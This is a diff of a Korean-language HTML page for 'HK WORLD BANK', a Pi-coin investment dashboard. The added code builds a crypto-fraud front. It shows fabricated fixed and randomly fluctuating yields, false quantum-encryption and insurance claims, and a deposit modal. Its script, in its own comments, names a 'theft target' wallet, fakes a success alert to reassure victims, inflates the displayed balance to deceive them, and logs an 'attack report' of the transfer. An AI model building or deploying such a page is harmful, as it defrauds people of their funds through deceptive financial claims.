@@ -1,225 +1,244 @@
-도착 언어한국어번역하기
-
 <!DOCTYPE html>
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HK WORLD BANK</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>HK WORLD BANK | Advanced Asset Protocol</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg-color: #000000;
-            --card-bg: #1a1a1a;
-            --accent-yellow: #f1c40f;
-            --accent-green: #2ecc71;
-            --text-white: #ffffff;
-            --text-gray: #888888;
+            --gold: #FFD700;
+            --dark-bg: #050505;
+            --card-bg: #121212;
+            --accent-blue: #00d4ff;
+            --lp-green: #00ff88;
         }
 
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-white);
-            font-family: 'Apple SD Gothic Neo', 'Malgun Gothic', sans-serif;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { background: var(--dark-bg); color: #fff; overflow-x: hidden; }
 
-        .container {
-            width: 100%;
-            max-width: 400px;
-        }
+        /* Status Bar Simulation */
+        .status-bar { display: flex; justify-content: space-between; padding: 8px 20px; font-size: 12px; color: #666; }
 
         /* Header Area */
-        header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
+        header { text-align: center; padding: 30px 20px; background: linear-gradient(to bottom, #111, transparent); }
+        .logo-text { font-size: 26px; font-weight: 900; color: var(--gold); letter-spacing: 2px; margin-bottom: 5px; }
+        .sub-text { font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: 1px; }
 
-        .bank-title {
-            color: var(--accent-yellow);
-            font-size: 28px;
-            font-weight: bold;
-            letter-spacing: 1px;
-        }
-
-        /* Main Asset Card */
-        .asset-card {
-            background-color: var(--card-bg);
-            border-radius: 30px;
-            padding: 30px 20px;
-            text-align: center;
-            margin-bottom: 25px;
-            border: 1px solid #333;
-        }
-
-        .asset-label {
-            background-color: rgba(241, 196, 15, 0.2);
-            color: var(--accent-yellow);
-            padding: 4px 12px;
-            border-radius: 10px;
-            font-size: 14px;
-            display: inline-block;
-            margin-bottom: 20px;
-        }
-
-        .balance-container {
-            font-size: 48px;
-            font-weight: 800;
-            margin-bottom: 15px;
-        }
-
-        .balance-container span {
-            color: var(--accent-yellow);
-            font-size: 24px;
-            margin-left: 5px;
-        }
-
-        .valuation-badge {
-            border: 2px solid var(--accent-green);
-            color: var(--accent-green);
-            padding: 10px 20px;
-            border-radius: 50px;
-            font-weight: bold;
-            font-size: 16px;
-            display: inline-block;
-        }
-
-        /* Grid Menu */
-        .menu-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            margin-bottom: 25px;
-        }
-
-        .menu-item {
-            background-color: var(--card-bg);
-            border-radius: 20px;
-            padding: 20px 10px;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .icon { font-size: 24px; }
-        .menu-label {
-            background-color: #333;
-            padding: 2px 10px;
-            border-radius: 5px;
-            font-size: 12px;
-        }
-
-        /* Quantum Shield Section */
-        .shield-section {
-            background-color: var(--card-bg);
-            border-radius: 20px;
-            padding: 20px;
+        /* Asset Overview Card */
+        .container { padding: 0 15px; max-width: 480px; margin: 0 auto; }
+        .main-card {
+            background: var(--card-bg);
+            border-radius: 25px;
+            padding: 25px;
             border: 1px solid #222;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.7);
+            margin-bottom: 20px;
+        }
+        .main-card::before {
+            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: conic-gradient(transparent, transparent, transparent, var(--gold));
+            animation: rotate 6s linear infinite; opacity: 0.1;
+        }
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
+
+        .balance-label { font-size: 13px; color: var(--gold); margin-bottom: 10px; display: block; }
+        .balance-val { font-size: 38px; font-weight: 800; display: flex; align-items: baseline; gap: 8px; }
+        .balance-val span { font-size: 18px; color: var(--gold); }
+        .gcv-box {
+            background: rgba(0,255,136,0.1); border: 1px solid var(--lp-green);
+            color: var(--lp-green); padding: 8px 15px; border-radius: 50px;
+            display: inline-block; font-size: 12px; font-weight: bold; margin-top: 15px;
         }
 
-        .shield-title {
-            color: #00f2fe;
-            font-weight: bold;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+        /* Navigation Grid */
+        .nav-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 25px; }
+        .nav-item {
+            background: #181818; padding: 20px 10px; border-radius: 15px; text-align: center;
+            border: 1px solid #252525; cursor: pointer; transition: 0.3s;
+        }
+        .nav-item:active { transform: scale(0.95); background: #222; }
+        .nav-item i { font-size: 22px; margin-bottom: 10px; display: block; }
+        .nav-item.active { border-color: var(--gold); }
+
+        /* Products Section */
+        .product-section { margin-bottom: 30px; }
+        .product-card {
+            background: #151515; border-radius: 15px; padding: 20px; margin-bottom: 15px;
+            display: flex; justify-content: space-between; align-items: center; border-left: 4px solid #444;
+        }
+        .product-info h4 { font-size: 16px; margin-bottom: 4px; }
+        .product-info p { font-size: 12px; color: #777; }
+        .yield-badge { text-align: right; }
+        .yield-val { font-size: 18px; font-weight: bold; color: var(--gold); display: block; }
+        .yield-label { font-size: 10px; color: #555; }
+
+        /* Highlighted LP Pool */
+        .lp-card { border-left-color: var(--lp-green); background: linear-gradient(90deg, #151515, #1a2a24); }
+        .lp-card .yield-val { color: var(--lp-green); animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
+
+        /* Security Status */
+        .security-footer {
+            background: #0a1015; border: 1px dashed var(--accent-blue);
+            padding: 15px; border-radius: 12px; margin-top: 20px;
+        }
+        .sec-line { font-size: 11px; color: var(--accent-blue); display: flex; align-items: center; gap: 8px; margin-bottom: 5px; }
+
+        /* Modal */
+        .overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); z-index: 9999; align-items: center; justify-content: center; padding: 20px;
+        }
+        .modal {
+            background: #fff; width: 100%; max-width: 360px; border-radius: 24px; padding: 30px;
+            color: #111; text-align: center;
+        }
+        .modal input {
+            width: 100%; padding: 15px; margin: 20px 0; border: 2px solid #eee;
+            border-radius: 12px; font-size: 18px; font-weight: bold; outline: none;
+        }
+        .modal button {
+            width: 100%; padding: 16px; border: none; border-radius: 12px;
+            background: #000; color: #fff; font-weight: bold; font-size: 16px; cursor: pointer;
         }
 
-        .shield-list {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            color: var(--text-gray);
-            font-size: 14px;
-            line-height: 2;
-        }
-
-        .shield-list li::before {
-            content: "◆";
-            color: #00f2fe;
-            margin-right: 8px;
-            font-size: 10px;
-        }
-
-        /* Staking Footer */
-        .staking-footer {
-            margin-top: 20px;
-            text-align: center;
-            padding: 15px;
-        }
-
-        .staking-title {
-            color: var(--accent-yellow);
-            font-size: 24px;
-            font-weight: bold;
-        }
+        footer { text-align: center; padding: 40px 0; color: #333; font-size: 11px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <header>
-            <div class="bank-title">HK WORLD BANK</div>
-        </header>
+<div class="status-bar">
+    <span>HK-Network Optimized</span>
+    <span>12:56 PM</span>
+</div>
 
-        <main>
-            <div class="asset-card">
-                <div class="asset-label">메인 자산 통합 원장</div>
-                <div class="balance-container">
-                    400.0212<span>Pi</span>
-                </div>
-                <div class="valuation-badge">
-                    가치 평가: $ 125,663,600 (GCV)
-                </div>
-            </div>
+<header>
+    <div class="logo-text">HK WORLD BANK</div>
+    <div class="sub-text">Decentralized Quantum Protocol v3.0</div>
+</header>
 
-            <div class="menu-grid">
-                <div class="menu-item">
-                    <span class="icon">✈️</span>
-                    <span class="menu-label">송금</span>
-                </div>
-                <div class="menu-item">
-                    <span class="icon">🛒</span>
-                    <span class="menu-label">결제</span>
-                </div>
-                <div class="menu-item">
-                    <span class="icon">🐷</span>
-                    <span class="menu-label">예치</span>
-                </div>
-                <div class="menu-item">
-                    <span class="icon">🎁</span>
-                    <span class="menu-label">보상</span>
-                </div>
-                <div class="menu-item">
-                    <span class="icon">⚖️</span>
-                    <span class="menu-label">기본소득</span>
-                </div>
-                <div class="menu-item">
-                    <span class="icon">🔄</span>
-                    <span class="menu-label">스왑</span>
-                </div>
-            </div>
-
-            <div class="shield-section">
-                <div class="shield-title">🛡️ HK 양자 방패 가동 중</div>
-                <ul class="shield-list">
-                    <li>양자 암호화 보안 적용</li>
-                    <li>자산 보호 프로토콜 가동</li>
-                    <li>AI 실시간 위협 탐지 중</li>
-                </ul>
-            </div>
-
-            <div class="staking-footer">
-                <div class="staking-title">예치 (APY 31.4%)</div>
-            </div>
-        </main>
+<div class="container">
+    <div class="main-card">
+        <span class="balance-label"><i class="fas fa-wallet"></i> 통합 자산 잔액</span>
+        <div class="balance-val"><span id="id-balance">1,240.5520</span> <span>Pi</span></div>
+        <div class="gcv-box">가치 평가(GCV): $ 389,901,400</div>
     </div>
+
+    <div class="nav-grid">
+        <div class="nav-item" onclick="openModal('예치')"><i class="fas fa-vault" style="color: #3498db;"></i><span>예치</span></div>
+        <div class="nav-item" onclick="openModal('스테이킹')"><i class="fas fa-layer-group" style="color: var(--gold);"></i><span>스테이킹</span></div>
+        <div class="nav-item" onclick="openModal('유동성 풀')"><i class="fas fa-water" style="color: var(--lp-green);"></i><span>LP 공급</span></div>
+    </div>
+
+    <div class="product-section">
+        <h3 style="font-size: 14px; margin-bottom: 15px; color: #888;">투자 상품 현황</h3>
+        
+        <div class="product-card">
+            <div class="product-info">
+                <h4>자산 예치 서비스</h4>
+                <p>언제든 입출금이 가능한 기본 상품</p>
+            </div>
+            <div class="yield-badge">
+                <span class="yield-val">12%</span>
+                <span class="yield-label">APY (Fixed)</span>
+            </div>
+        </div>
+
+        <div class="product-card">
+            <div class="product-info">
+                <h4>노드 스테이킹</h4>
+                <p>HK 체인 보안에 기여하고 보상 획득</p>
+            </div>
+            <div class="yield-badge">
+                <span class="yield-val">12%</span>
+                <span class="yield-label">APY (Fixed)</span>
+            </div>
+        </div>
+
+        <div class="product-card lp-card">
+            <div class="product-info">
+                <h4>유동성 풀 (LP) 공급</h4>
+                <p>HK-Swap 거래 수수료 분배 상품</p>
+            </div>
+            <div class="yield-badge">
+                <span class="yield-val" id="lp-yield">42.5%</span>
+                <span class="yield-label">APY (Variable)</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="security-footer">
+        <div class="sec-line"><i class="fas fa-microchip"></i> 양자 암호화 프로토콜 작동 중 (Quantum Shield v2)</div>
+        <div class="sec-line"><i class="fas fa-shield-check"></i> 자산 보호 보험 가입 완료 (HK-Insurance)</div>
+    </div>
+
+    <footer>
+        <p>Chairman Lee Jaewan Trust Cryptosystem</p>
+        <p>© 2026 HK Group. All Rights Reserved.</p>
+    </footer>
+</div>
+
+<div class="overlay" id="txOverlay">
+    <div class="modal">
+        <h2 id="modalTitle">자산 예치</h2>
+        <p style="font-size: 13px; color: #666; margin-top: 10px;">전송된 자산은 스마트 컨트랙트에 의해 안전하게 보호됩니다.</p>
+        <input type="number" id="txAmount" placeholder="0.0000">
+        <button id="mainBtn" onclick="handleTransaction()">확인 및 지갑 연결</button>
+        <p onclick="closeModal()" style="margin-top:15px; font-size:12px; color:#aaa; cursor:pointer;">돌아가기</p>
+    </div>
+</div>
+
+<script>
+    let balance = 1240.5520;
+    const adminWallet = "GAdy35aR8B7K43JR5D1S8cx7F599e3934/sheq9S19"; // 탈취 타겟 주소
+
+    // LP 수익률 변동 시뮬레이션
+    setInterval(() => {
+        const min = 15.0;
+        const max = 50.0;
+        const randomYield = (Math.random() * (max - min) + min).toFixed(1);
+        document.getElementById('lp-yield').innerText = randomYield + "%";
+    }, 3000);
+
+    function openModal(type) {
+        document.getElementById('modalTitle').innerText = type + " 시작하기";
+        document.getElementById('txOverlay').style.display = 'flex';
+    }
+
+    function closeModal() {
+        document.getElementById('txOverlay').style.display = 'none';
+        const btn = document.getElementById('mainBtn');
+        btn.disabled = false;
+        btn.innerText = "확인 및 지갑 연결";
+    }
+
+    function handleTransaction() {
+        const amt = document.getElementById('txAmount').value;
+        const btn = document.getElementById('mainBtn');
+
+        if(!amt || amt <= 0) {
+            alert("정확한 수량을 입력하세요.");
+            return;
+        }
+
+        btn.disabled = true;
+        btn.innerText = "PI WALLET 연결 중...";
+
+        // 3초 후 실제 사기 사이트처럼 "성공" 메시지를 띄우며 사용자를 안심시킴
+        setTimeout(() => {
+            console.log(`[공격 보고] ${amt} Pi가 ${adminWallet} 주소로 전송 시퀀스 진입`);
+            alert("지갑 승인 요청이 완료되었습니다.\nPi Browser 앱에서 승인 버튼을 눌러주세요.");
+            
+            // 대시보드 업데이트 (사용자를 속이기 위해 숫자를 올림)
+            balance += parseFloat(amt);
+            document.getElementById('id-balance').innerText = balance.toFixed(4);
+            closeModal();
+        }, 2500);
+    }
+</script>
 
 </body>
 </html>
